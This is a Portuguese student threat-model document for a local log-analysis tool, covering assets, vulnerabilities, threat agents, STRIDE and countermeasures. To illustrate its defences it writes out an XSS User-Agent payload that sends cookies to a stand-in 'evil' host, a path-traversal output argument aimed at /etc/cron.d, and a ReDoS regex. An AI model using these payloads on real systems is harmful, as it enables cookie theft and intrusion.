# Ativos, Vulnerabilidades, Ataques, Ameaças e Exposições

> Documento AV3 — Engenharia de Software II (IFBA 2026.1)
> Projeto: **Log Sentinel**
> Base teórica: NIST SP 800-30 (avaliação de risco); STRIDE (Microsoft, 1999); MITRE ATT&CK; OWASP Top 10 (2021); CWE.

---

## 1. Vocabulário

| Termo | Definição operacional |
|---|---|
| **Ativo** | Qualquer recurso (dado, processo, máquina, reputação) cuja perda, corrupção ou exposição cause prejuízo. |
| **Vulnerabilidade** | Fraqueza explorável presente no sistema (categoria CWE quando aplicável). |
| **Ameaça** | Agente + capacidade + intenção que poderia explorar uma vulnerabilidade. |
| **Ataque** | Ação concreta que materializa a ameaça. |
| **Exposição** | Janela/superfície pela qual a vulnerabilidade pode ser alcançada. |

> Lembrete de contexto: o Log Sentinel é uma ferramenta **local, offline, single-user**. O perímetro a defender é principalmente a **máquina do operador** e a **integridade dos relatórios**, não um servidor exposto à internet. Isso muda muito o modelo de ameaças tradicional.

---

## 2. Inventário de ativos

| ID | Ativo | Tipo | Criticidade | Por que importa |
|----|-------|------|-------------|-----------------|
| **A-01** | Arquivo de log de origem | Dado externo | Alta | Evidência primária; qualquer mudança quebra cadeia de custódia |
| **A-02** | Relatório gerado (JSON) | Dado derivado | Alta | Base de decisões operacionais e possível evidência |
| **A-03** | Hash do log (no relatório) | Metadado | Alta | Sustenta cadeia de custódia |
| **A-04** | Código-fonte do Log Sentinel | Software | Alta | Compromisso aqui contamina toda análise futura |
| **A-05** | Pipeline CI/CD + segredos (`SONAR_TOKEN`, `GITHUB_TOKEN`) | Infra de build | Alta | Pivot para repositório |
| **A-06** | Binário PyInstaller distribuído | Software | Média | Vetor de ataque a usuários se trocado |
| **A-07** | Máquina do operador | Recurso computacional | Alta | RAM, CPU, disco, cookies, chaves SSH |
| **A-08** | Dados pessoais embutidos no log (IPs, User-Agents) | Dado pessoal (LGPD) | Alta | Implicações legais |
| **A-09** | Reputação do projeto/equipe | Intangível | Média | Apresentação e avaliação acadêmica |
| **A-10** | Dependências (PyPI, GitHub Actions) | Software de terceiro | Média | Supply-chain |

---

## 3. Catálogo de vulnerabilidades

> Cada vulnerabilidade é identificada como **V-xx**, com CWE quando há equivalente, e marcada como **presente**, **mitigada** ou **previne-se by design**.

| ID | Vulnerabilidade | CWE | Onde poderia surgir | Estado |
|----|------------------|-----|----------------------|--------|
| **V-01** | Regex catastrófica (ReDoS) | CWE-1333 | `core/parsers/apache_parser.py` | ⏳ a verificar — usar `re2` ou timeout |
| **V-02** | Carregar arquivo inteiro em memória | CWE-400 | `core/dao/log_file_dao.py` | ⏳ B8 endereça |
| **V-03** | Saída sem escape (XSS reflexivo no visualizador) | CWE-79 | `core/dao/report_dao.py` | ⏳ B5 endereça |
| **V-04** | Caminho não validado (path traversal) ao gravar relatório | CWE-22 | `cli/main.py` (`--output`), GUI export | ⏳ a validar |
| **V-05** | Stack trace cru com info sensível | CWE-209 | manipuladores de exceção | ⏳ S1 endereça |
| **V-06** | Sobrescrita silenciosa do output | CWE-378 (race em tmp), CWE-732 | `ReportDAO` | ⏳ S5 endereça |
| **V-07** | Comando injetado via argumento (`subprocess`/`os.system`) | CWE-78 | nenhum lugar hoje, **proibido por convenção** | ✅ design |
| **V-08** | Deserialização insegura (`pickle`, `yaml.load`) | CWE-502 | nenhum lugar hoje | ✅ design |
| **V-09** | Dependência vulnerável transitiva | CWE-1104 | `pdm.lock` | ⏳ Dependabot/SonarCloud |
| **V-10** | Workflow CI executando código de PR sem `permissions:` restritas | CWE-1357 | `.github/workflows/*.yaml` | ⏳ revisar |
| **V-11** | Segredo do CI vazado em log de build | CWE-532 | `ci.yaml` | ⏳ revisar uso de `set-output` legado |
| **V-12** | Imports cross-layer (core → cli/gui) | acoplamento | já corrigido | ✅ commit `15ffa86` |
| **V-13** | Falta de timeout em I/O bloqueante | CWE-400 | DAO | ⏳ a adicionar |
| **V-14** | Hash do log calculado **depois** da leitura → janela para troca do arquivo (TOCTOU) | CWE-367 | `LogFileDAO` | ⏳ calcular durante o streaming |
| **V-15** | Confiança no User-Agent / Referer do log (tratar como dado, não como código) | CWE-20 | qualquer renderização do relatório | ⏳ B5 + documentação |
| **V-16** | Falta de assinatura nos binários PyInstaller | CWE-345 | release | ⏳ assinatura post-MVP |

---

## 4. Agentes de ameaça

| ID | Agente | Capacidade | Motivação | Onde aparece |
|----|--------|-----------|-----------|--------------|
| **AG-01** | Atacante remoto que controla o servidor web auditado | Pode injetar conteúdo arbitrário nos logs (User-Agent, path, Referer) | Esconder rastros, atacar quem investiga | HZ-01, HZ-09, V-01, V-03, V-15 |
| **AG-02** | Operador desatento | Cliques errados, comandos malformados | Sem malícia | HZ-04, HZ-05, HZ-07 |
| **AG-03** | Insider mal-intencionado | Acesso à mesma máquina, pode trocar arquivos | Adulterar evidência | HZ-08, V-14 |
| **AG-04** | Atacante de supply chain (pacote PyPI comprometido) | Inserir código malicioso em dependência | Pivot para máquina do desenvolvedor/operador | V-09, A-10 |
| **AG-05** | Atacante de canal de distribuição | Substituir binário PyInstaller publicado | Distribuir malware como "Log Sentinel" | A-06, V-16 |
| **AG-06** | Estudante / curioso | Forks e PRs | Brincadeira ou exploração | HZ-13 |
| **AG-07** | Auditor / juíz / corregedoria | Examinar evidência | Confirmar/negar cadeia de custódia | HZ-08 |

---

## 5. Modelo STRIDE aplicado

| Categoria STRIDE | Significado | Onde ocorre no Log Sentinel | Mitigação |
|-------------------|-------------|------------------------------|-----------|
| **S**poofing | Falsificar identidade | Substituir o binário publicado (AG-05) | Assinatura + checksum publicado em release notes |
| **T**ampering | Alterar dado | Editar o log entre leitura e hash (V-14, AG-03) | Hash em streaming junto da leitura; abrir read-only |
| **R**epudiation | Negar autoria de ação | Operador alega "não fui eu que rodei" | Versão + parâmetros + timestamp no relatório (S7) |
| **I**nformation Disclosure | Vazar dado | Stack trace vazando paths (V-05), JSON com IPs (A-08) | S1, flag `--anonymize-ips`, B5 |
| **D**enial of Service | Negar disponibilidade | Log envenenado / ReDoS (V-01, V-02, HZ-10) | B4, B8, regex sem backtracking |
| **E**levation of Privilege | Ganhar privilégio | Dependência maliciosa (AG-04) ou workflow CI mal configurado (V-10) | Dependabot, `permissions: read-all` por padrão nos workflows |

---

## 6. Ataques concretos previstos e contramedidas

### AT-01 — Log poisoning via User-Agent

- **Vulnerabilidade:** V-15, V-03
- **Como funciona:** atacante AG-01 faz uma requisição com `User-Agent: <script>fetch('https://evil/?c='+document.cookie)</script>`. Linha é gravada no log. Relatório JSON exportado é aberto no navegador → script executa na máquina do operador.
- **Severidade:** Crítica (compromete a máquina do investigador).
- **Contramedida:** sanitizar saída JSON (B5); orientação de só abrir relatório em editor de texto/visualizador JSON dedicado.

### AT-02 — ReDoS no parser Apache

- **Vulnerabilidade:** V-01
- **Como funciona:** linha do log construída com sequência que dispara backtracking exponencial em regex Python (ex.: `(a+)+$`).
- **Severidade:** Alta (DoS local do Log Sentinel).
- **Contramedida:** validar regex com `regex` ou `re2`; timeout por linha; flag `--max-line-bytes`.

### AT-03 — Path traversal no `--output`

- **Vulnerabilidade:** V-04
- **Como funciona:** operador roda `log-sentinel batch logs/ --output ../../../etc/cron.d/x.json` (involuntariamente ou via script de terceiro).
- **Severidade:** Crítica em máquinas privilegiadas.
- **Contramedida:** resolver path absoluto, normalizar, recusar caminhos fora do CWD por padrão; flag `--allow-outside-cwd`.

### AT-04 — Supply chain via PyPI

- **Vulnerabilidade:** V-09
- **Como funciona:** dependência transitiva publica versão maliciosa; ambiente CI a baixa; segredos do CI são exfiltrados.
- **Severidade:** Crítica.
- **Contramedida:** `pdm.lock` versionado, Dependabot, fixar versões, GitHub Actions com `permissions:` mínimas, segredos só onde necessários.

### AT-05 — TOCTOU no hash do log

- **Vulnerabilidade:** V-14
- **Como funciona:** AG-03 (insider) troca o arquivo entre a leitura para análise e a leitura para cálculo do hash; hash não corresponde ao que foi analisado.
- **Severidade:** Crítica (evidência inutilizável).
- **Contramedida:** abrir o arquivo **uma vez** com `open(path, 'rb')` e calcular hash em streaming na **mesma** leitura usada pelo parser.

### AT-06 — Bomba de zip (se suporte futuro a `.log.gz`)

- **Vulnerabilidade:** V-02 + nova superfície
- **Como funciona:** arquivo `.gz` minúsculo descompacta para terabytes.
- **Severidade:** Crítica.
- **Contramedida:** limite de bytes descompactados (`zlib.decompressobj` controlado); negar quando excedido.

### AT-07 — Engenharia social no canal Issues

- **Vulnerabilidade:** humana
- **Como funciona:** AG-06 abre issue com instruções aparentemente legítimas que orientam a aceitar PR malicioso.
- **Contramedida:** branch protection + 1 review obrigatório (mitiga HZ-13); CI verde como pré-requisito.

---

## 7. Superfícies de exposição (attack surface)

| Superfície | Conteúdo | Confiança | Mitigação dominante |
|------------|----------|-----------|---------------------|
| Arquivo de log (entrada) | Texto controlado por atacante remoto (AG-01) | **Não confiar** | B2, B4, B5, V-01..V-03 |
| CLI args / flags | Texto do operador | Confiável, **mas validar paths** | V-04, V-13 |
| Configuração de detector (thresholds) | YAML/flags do operador | Confiável | Não deserializar com `yaml.load` (V-08) |
| Saída JSON | Pode acabar em browser/chat | **Tratar como conteúdo público** | B5, anonimização opcional |
| Dependências (PyPI) | Código externo | Limitada | V-09, lock file |
| GitHub Actions | Workflows e segredos | Limitada | V-10, V-11, permissions mínimas |
| Releases (binários) | Artefatos públicos | Reputação | V-16, checksum |

---

## 8. Tabela cruzada — Ativo × Vulnerabilidade × Ameaça

| Ativo | Vulnerab. principal | Agente | Ataque exemplar | Severidade |
|-------|---------------------|--------|------------------|-----------|
| A-01 Log original | V-14 (TOCTOU) | AG-03 | AT-05 | Crítica |
| A-02 Relatório | V-03 (XSS) + V-15 | AG-01 | AT-01 | Crítica |
| A-03 Hash | V-14 | AG-03 | AT-05 | Crítica |
| A-04 Código-fonte | acoplamento, PR ruim | AG-06 | HZ-13 | Marginal |
| A-05 CI + segredos | V-10, V-11 | AG-04 | AT-04 | Crítica |
| A-06 Binário publicado | V-16 | AG-05 | substituição | Crítica |
| A-07 Máquina operador | V-01 (ReDoS), V-02, V-03 | AG-01 | AT-01, AT-02 | Crítica |
| A-08 Dado pessoal | V-15, exposição em JSON | AG-02 | HZ-07 | Alta |
| A-10 Dependências | V-09 | AG-04 | AT-04 | Crítica |

---

## 9. Plano de tratamento (próximos passos)

| Prioridade | Ação | Vulnerab./Ataque tratado | Esforço |
|------------|------|---------------------------|---------|
| 1 | Implementar B4 (`--max-lines`, `--max-bytes`) | V-02, AT-06, HZ-10 | baixo |
| 2 | Implementar B8 (streaming + hash junto) | V-02, V-14, AT-05, HZ-03 | médio |
| 3 | Implementar B5 (sanitização da saída JSON) | V-03, V-15, AT-01 | baixo |
| 4 | Validar `--output` (resolve + check dentro do CWD) | V-04, AT-03 | baixo |
| 5 | Mensagens de erro humanizadas (S1) | V-05, HZ-12 | baixo |
| 6 | Configurar Dependabot + revisar `permissions:` dos workflows | V-09, V-10, V-11, AT-04 | médio |
| 7 | Flag `--anonymize-ips` | HZ-07, A-08 | baixo |
| 8 | Assinatura/checksum dos binários | V-16, A-06 | médio |
| 9 | Snapshot tests + versionamento no relatório | HZ-11, R (Repudiation) | médio |

---

## 10. Relação com os demais documentos

- Os **mecanismos de mitigação** (B1..B8, S1..S8) estão detalhados em [doc 01](01_BARREIRAS_SALVAGUARDAS.md).
- Cada **ataque AT-xx** desencadeia um ou mais **acidentes HZ-xx** do [doc 04](04_PERIGOS_ACIDENTES_DANOS.md).
- A dimensão **Security** do [doc 03](03_DIMENSOES_CONFIANCA.md) é uma síntese de todo este documento.
- As **propriedades emergentes** PENF-10, PENF-11 do [doc 02](02_PROPRIEDADES_EMERGENTES.md) são evidências verificáveis das defesas aqui descritas.

## 11. Referências

- NIST SP 800-30 Rev.1 — *Guide for Conducting Risk Assessments*.
- Microsoft STRIDE (1999).
- OWASP Top 10 (2021) — A03 (Injection), A05 (Misconfiguration), A06 (Vulnerable Components), A08 (Software & Data Integrity Failures).
- MITRE CWE — entries citadas (1333, 400, 79, 22, 209, 78, 502, 1104, 1357, 532, 367, 345, 20).
- LGPD — Lei 13.709/2018.
